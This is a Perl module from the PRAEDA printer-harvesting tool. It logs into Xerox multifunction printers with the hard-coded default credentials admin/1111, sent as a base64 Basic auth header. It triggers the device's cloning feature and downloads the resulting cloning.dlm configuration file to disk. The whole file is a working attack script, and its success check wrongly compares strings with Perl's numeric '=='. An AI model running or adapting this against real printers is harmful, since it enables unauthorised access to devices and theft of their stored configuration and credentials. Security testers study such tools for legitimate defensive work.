# Xerox clone Download
######################################################
#                    PRAEDA Module #MP0013           #
#        Copyright (C) 2010 Foofus.net		     #
#              Deral 'percX' Heiland                 #
######################################################
package MP0013;
sub MP0013
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


#Open output file for loging 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting Clone Download Xerox  $TARGET : JOB MP0013**********\n";
     print OUTFILE "\n**********Attempting Clone Download Xerox $TARGET : JOB MP0013**********\n";

# Download of Job Account Record
my $browser = LWP::UserAgent->new(timeout => 120);

#default username=admin and password=1111
   $browser->default_header(Authorization=> "Basic YWRtaW46MTExMQ==");


my $response = $browser->post("http$web://$TARGET:$PORTS/properties/GeneralSetup/Clone/saveCloning.cgi",
   [
    "CLONE_FEATURES" => "1%2C6%2C8%2C4%2C5%2C9%2C16%2C7%2C12%2C14%2C17%2C",
    "NextPage" => "/properties/cloning.dhtml",
    "feature1" => "1",
    "feature1" => "6",
    "feature1" => "8",
    "feature1" => "4",
    "feature1" => "5",
    "feature1" => "9",
    "feature1" => "16",
    "feature1" => "7",
    "feature1" => "12",
    "feature1" => "14",
    "feature1" => "17",
   ]);

# print $response->title;

if ( $response->title == "Cloning" )
     {
      my $cloning = $browser->get("http$web://$TARGET:$PORTS/cloning.dlm");
      open(JOBACCTOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-cloning.dlm") || die("Failed to open  Output file $TARGET-$PORTS-cloning.dlm \n");
      print JOBACCTOUTFILE $cloning->content;
      #print $cloning->content;
      print "***********Clone Download Xerox $TARGET-$PORTS-cloning.dlm **********\n";
      print OUTFILE "********** Clone Download Xerox $TARGET-$PORTS-cloning.dlm **********\n";

# operation completed close out output files
close(JOBACCTOUTFILE);
     }

else
     {

print "Cloning post failed";
     }

close(OUTFILE);
}
1;
